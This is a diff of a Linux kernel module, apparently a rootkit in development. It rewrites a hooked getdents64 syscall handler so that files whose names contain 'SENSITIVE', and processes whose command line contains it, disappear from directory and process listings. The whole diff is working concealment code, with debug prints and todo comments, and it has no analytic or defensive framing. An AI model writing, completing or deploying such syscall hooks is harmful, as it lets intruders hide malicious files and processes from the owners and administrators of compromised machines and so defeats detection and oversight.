@@ -109,38 +109,42 @@ asmlinkage int hook_getdents(const struct pt_regs* regs)
     bytes_left = ret;
     while (bytes_left > 0) {
         d = (struct linux_dirent64 *)((char *)kdirent + offset);
-        size_t tmp = d->d_reclen;
+        size_t shift_by = 0;
         if (strstr(d->d_name, "SENSITIVE")) {
-            memmove(d, (char *)d + tmp, bytes_left - tmp);
-            ret -= tmp;
-            bytes_left -= tmp;
-            continue;
-        } else if (is_numeric(d->d_name)) {
+            shift_by = d->d_reclen; 
+            goto shift_and_iter;
+	    } else if (is_numeric(d->d_name)) {
             int pid;
             if (kstrtoint(d->d_name, 10, &pid) == 0) {
                 char *cmdline;
                 size_t cmd_size;
                 cmdline = read_cmdline_from_task(pid, &cmd_size);
                 if (cmdline) {
-                    size_t i;
-                    for (i = 0; i < cmd_size; i++) {
+                    for (size_t i = 0; i < cmd_size; i++) {
                         if (cmdline[i] == '\0')
                             cmdline[i] = ' ';
                     }
-                    if (strstr(cmdline, "SENSITIVE"))
-                        pr_info("detected %s", cmdline);
-                    kfree(cmdline);
-                    memmove(d, (char *)d + tmp, bytes_left - tmp);
-                    ret -= tmp;
-                    bytes_left -= tmp;
-                    continue;
-                    
-                }
+                    if (strstr(cmdline, "SENSITIVE")) {
+                        kfree(cmdline); // todo free either way
+                        shift_by = d->d_reclen; 
+                        goto shift_and_iter;
+                    }
+                    kfree(cmdline); // kfree should be called here also 
+                }            
             }
         }
-        offset += d->d_reclen;
-        bytes_left -= d->d_reclen;
-        pr_info("hello from %s\n", d->d_name);
+
+shift_and_iter:
+	    if (shift_by > 0) {
+	        memmove(d, (char *)d + shift_by, bytes_left - shift_by);
+	        ret -= shift_by > 0 ? shift_by : 0; // no need to shift at all if 0
+            bytes_left -= shift_by; // shift != reclen here (reclen infers to the next one
+        } else {
+            offset += d->d_reclen; // offset should not be updated when shifting
+            bytes_left -= d->d_reclen;
+            pr_info("hello from %s\n", d->d_name);
+        }
+	    continue;
     }
 
     if (copy_to_user(dirp, kdirent, ret)) {
